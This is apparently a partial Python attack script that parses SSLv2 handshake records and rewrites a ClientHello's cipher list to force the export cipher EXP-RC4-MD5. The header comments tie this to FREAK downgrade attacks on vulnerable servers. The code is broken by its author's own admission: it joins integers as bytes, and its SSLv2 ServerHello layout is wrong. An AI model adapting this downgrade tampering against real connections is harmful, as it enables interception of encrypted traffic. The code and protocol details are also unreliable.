### Methods for parsing and tampering SSLv2 Handshake records, trying to force export ciphers.
### They are not fully functional. Started working in SSLv2 type of records in order to avoid the digest error 
### which appears in TLS when tampering any handshake message, because of the "Finished" encrypted messages which
### contain the hash of all handshake messages, as seen by each party. 
### Stopped working on this when I discovered that weak temporary RSA keys generated by vulnerable servers were reused
### for days due to generation costs, which actually allows FREAK without the need to break the key in no time.
### Client Hello gets modified successfully, however ServerHello's chosen cipher is not identified correctly



def parse_sslv2_clienthello(body):
    """Parse SSLv2 ClientHello body and return a list of cipher specs.

    SSLv2 ClientHello layout (body):
      0: msg_type (1)
      1-2: version (2)
      3-4: cipher_spec_length (2)
      5-6: session_id_length (2)
      7-8: challenge_length (2)
      9.. : cipher_specs (cipher_spec_length bytes, 3 bytes each), session_id, challenge
    """
    if len(body) < 9:
        return []
    msg_type = body[0]
    if msg_type != 1:
        return []
    version = body[1:3]
    cs_len = int.from_bytes(body[3:5], 'big')
    sid_len = int.from_bytes(body[5:7], 'big')
    chal_len = int.from_bytes(body[7:9], 'big')
    offset = 9
    cs_bytes = body[offset:offset+cs_len]
    ciphers = []
    for i in range(0, len(cs_bytes), 3):
        spec = cs_bytes[i:i+3]
        if len(spec) < 3:
            continue
        # represent as hex and also map to TLS two-byte suite (last two bytes)
        spec_hex = spec.hex()
        tls_suite = int.from_bytes(spec[1:3], 'big')
        ciphers.append((spec_hex, tls_suite))

    return ciphers


def modify_sslv2_clienthello(body):
    """Return a modified SSLv2 ClientHello body where all cipher specs are
    replaced by the given TLS suite (repeated) while keeping lengths same.

    new_tls_suite is a 2-byte value (e.g. 0x0008). We build 3-byte specs as
    \x00 + suite (0x00 || suite) and repeat to match original cipher_spec_length.
    """
    if len(body) < 9:
        return body
    msg_type = body[0]
    if msg_type != 1:
        return body
    cs_len = int.from_bytes(body[3:5], 'big')
    # compute number of full 3-byte specs
    n_specs = cs_len // 3
    offset = 9
    orig_cs = body[offset:offset+cs_len]
    new_cs_parts = []
    for i in range(0, n_specs):
        start = i*3
        new_spec = 0x020080 # EXP-RC4-MD5 
        new_cs_parts.append(new_spec)
    new_cs_bytes = b''.join(new_cs_parts)
    # if there was a remainder, preserve original tail bytes
    rem = cs_len - (n_specs * 3)
    if rem:
        new_cs_bytes += orig_cs[-rem:]
    # rebuild body: header(0..8) + new_cs_bytes + rest
    rest = body[offset+cs_len:]
    new_body = body[:offset] + new_cs_bytes + rest
    return new_body


def parse_sslv2_serverhello(body):
    """Parse SSLv2 ServerHello body and return the chosen cipher (if present).

    SSLv2 ServerHello layout (body):
      0: msg_type (1)
      1-2: cipher_spec_length (2)
      3-4: session_id_length (2)
      5-6: certificate_length (2)
      7.. : cipher_specs (cipher_spec_length bytes), session_id, certificate
    The server typically includes the selected cipher as the first 3-byte cipher_spec.
    """
    if len(body) < 7:
        return None
    msg_type = body[0]
    if msg_type != 4:
        return None
    cs_len = int.from_bytes(body[1:3], 'big')
    sid_len = int.from_bytes(body[3:5], 'big')
    cert_len = int.from_bytes(body[5:7], 'big')
    offset = 7
    cs_bytes = body[offset:offset+cs_len]
    chosen = None
    if len(cs_bytes) >= 3:
        spec = cs_bytes[0:3]
        spec_hex = spec.hex()
        tls_suite = int.from_bytes(spec[1:3], 'big')
        chosen = (spec_hex, tls_suite)
    return chosen